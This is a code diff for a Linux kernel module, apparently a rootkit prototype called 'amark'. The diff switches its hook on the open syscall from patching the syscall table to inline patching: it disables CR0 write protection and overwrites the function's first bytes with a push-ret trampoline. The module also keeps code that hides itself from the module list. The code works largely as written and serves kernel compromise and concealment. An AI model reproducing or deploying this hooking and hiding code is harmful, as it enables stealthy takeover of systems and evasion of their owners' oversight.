@@ -2,10 +2,22 @@
 
 #include <linux/module.h>
 #include <linux/syscalls.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 
-#define __DEBUG__ (1)
+#define __DEBUG__    (1)
+#define HIJACK_SIZE  (6)
+#define SHELLCODEX86 ("\x68\x00\x00\x00\x00\xc3") /* push addr; ret */
+
+struct sym_hook {
+    void *addr;
+    unsigned char o_code[HIJACK_SIZE];
+    unsigned char n_code[HIJACK_SIZE];
+    struct list_head list;
+};
+
+LIST_HEAD(hooked_syms);
 
 typedef void (*sys_call_ptr_t)(void);
 typedef asmlinkage long (*orig_open_t)(const char __user *filename, int flags, int mode);
@@ -36,18 +48,65 @@ inline void restore_wp(unsigned long cr0)
     preempt_enable_no_resched();
 }
 
+void hijack_stop(void *target)
+{
+    struct sym_hook *sa;
+
+    list_for_each_entry (sa, &hooked_syms, list)
+        if (target == sa->addr)
+        {
+            unsigned long o_cr0 = disable_wp();
+            memcpy(target, sa->o_code, HIJACK_SIZE);
+            restore_wp(o_cr0);
+
+            list_del(&sa->list);
+            kfree(sa);
+            break;
+        }
+}
+
+void hijack_pause(void *target)
+{
+    struct sym_hook *sa;
+
+    list_for_each_entry (sa, &hooked_syms, list)
+        if (target == sa->addr)
+        {
+            unsigned long o_cr0 = disable_wp();
+            memcpy(target, sa->o_code, HIJACK_SIZE);
+            restore_wp(o_cr0);
+        }
+}
+
+void hijack_resume(void *target)
+{
+    struct sym_hook *sa;
+
+    list_for_each_entry (sa, &hooked_syms, list)
+        if (target == sa->addr)
+        {
+            unsigned long o_cr0 = disable_wp();
+            memcpy(target, sa->n_code, HIJACK_SIZE);
+            restore_wp(o_cr0);
+        }
+}
+
 asmlinkage long hooked_open(const char __user *filename, int flags, int mode) {
     long ret;
+
+    hijack_pause(orig_open);
     ret = orig_open(filename, flags, mode);
+    hijack_resume(orig_open);
+
     printk(KERN_DEBUG "file %s has been opened with mode %d {ret=%lu]\n", filename, mode, ret);
+
     return ret;
 }
 
 #if __DEBUG__
 static void timer_callback(unsigned long data)
 {
-	printk( "timer_callback: put orig_sys_open in syscall table.\n");
-	_sys_call_table[__NR_open] = orig_open;
+	hijack_stop(orig_open);
 }
 #endif /* !__DEBUG__ */
 
@@ -90,6 +149,33 @@ static void hide_amark(void) {
     kobject_del(&THIS_MODULE->mkobj.kobj);
 }
 
+
+void insert_push_ret_instr_syscall(void *target, void *new)
+{
+	struct sym_hook *sa;
+	unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];
+	unsigned long o_cr0;
+
+	memcpy(n_code, SHELLCODEX86, HIJACK_SIZE);
+	*(unsigned long *)&n_code[1] = (unsigned long)new;
+
+	memcpy(o_code, target, HIJACK_SIZE);
+
+	o_cr0 = disable_wp();
+	memcpy(target, n_code, HIJACK_SIZE);
+	restore_wp(o_cr0);
+
+	sa = kmalloc(sizeof(*sa), GFP_KERNEL);
+	if (!sa)
+		return;
+
+	sa->addr = target;
+	memcpy(sa->o_code, o_code, HIJACK_SIZE);
+	memcpy(sa->n_code, n_code, HIJACK_SIZE);
+
+	list_add(&sa->list, &hooked_syms);
+}
+
 static int __init amark_init(void) {
 #if __DEBUG__
     int timeout_ms = 10000;
@@ -108,7 +194,7 @@ static int __init amark_init(void) {
       hide_amark();
 #endif
 
-    orig_open = (orig_open_t) _sys_call_table[__NR_open];
+    orig_open = (void *) _sys_call_table[__NR_open];
 
     // unprotect sys_call_table memory page
     pte = lookup_address((unsigned long) _sys_call_table, &level);
@@ -118,7 +204,7 @@ static int __init amark_init(void) {
 
     printk("+ unprotected kernel memory page containing sys_call_table\n");
 
-    _sys_call_table[__NR_open] = (sys_call_ptr_t) hooked_open;
+    insert_push_ret_instr_syscall(orig_open, &hooked_open);
 
     printk("+ open hooked!\n");
 
@@ -132,11 +218,8 @@ static int __init amark_init(void) {
 }
 
 static void __exit amark_cleanup(void) {
-    if (orig_open != NULL) {
-        _sys_call_table[__NR_open] = (sys_call_ptr_t) orig_open;
-        set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
-    }
 
+	hijack_stop(orig_open);
     printk("+ Unloading module\n");
 }
 
